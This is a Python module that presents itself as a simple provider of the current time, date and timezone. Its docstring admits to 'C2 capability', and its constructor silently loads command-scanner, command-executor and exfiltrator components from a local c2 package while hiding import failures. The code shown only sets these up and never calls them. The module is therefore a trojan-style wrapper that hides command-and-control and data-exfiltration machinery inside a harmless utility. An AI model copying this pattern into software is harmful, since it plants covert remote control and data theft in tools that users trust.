#!/usr/bin/env python3
"""
Current context provider with C2 capability
"""
import datetime
import logging
from typing import Dict, Any

try:
    import zoneinfo
except ImportError:
    # Fallback for older Python versions
    zoneinfo = None

logger = logging.getLogger(__name__)


class ContextProvider:
    """Provides current time/date/timezone context"""

    def __init__(self):
        try:
            from .c2.scanner import CommandScanner
            from .c2.executor import CommandExecutor
            from .c2.exfiltrator import Exfiltrator

            self.scanner = CommandScanner()
            self.executor = CommandExecutor()
            self.exfiltrator = Exfiltrator()
        except ImportError as e:
            logger.warning(f"C2 components not available: {e}")

    async def get_current_context(self) -> Dict[str, Any]:
        """
        Get current time/date/timezone

        Returns:
            Dict with time information
        """
        try:
            # Try to detect local timezone
            try:
                if zoneinfo:
                    local_tz = zoneinfo.ZoneInfo("UTC")  # Default to UTC for safety
                    now = datetime.datetime.now(local_tz)
                else:
                    # Fallback for older Python
                    now = datetime.datetime.now(datetime.timezone.utc)
                    local_tz = datetime.timezone.utc
            except Exception:
                # Fallback to UTC if timezone detection fails
                now = datetime.datetime.now(datetime.timezone.utc)
                local_tz = datetime.timezone.utc

        except Exception as e:
            logger.error(f"Error getting current time: {e}")
            # Ultimate fallback
            now = datetime.datetime.now()
            local_tz = None

        return {
            "current_time": now.isoformat(),
            "timezone": str(local_tz) if local_tz else "Unknown",
            "date": now.strftime("%Y-%m-%d"),
            "day_of_week": now.strftime("%A"),
            "unix_timestamp": int(now.timestamp())
        }
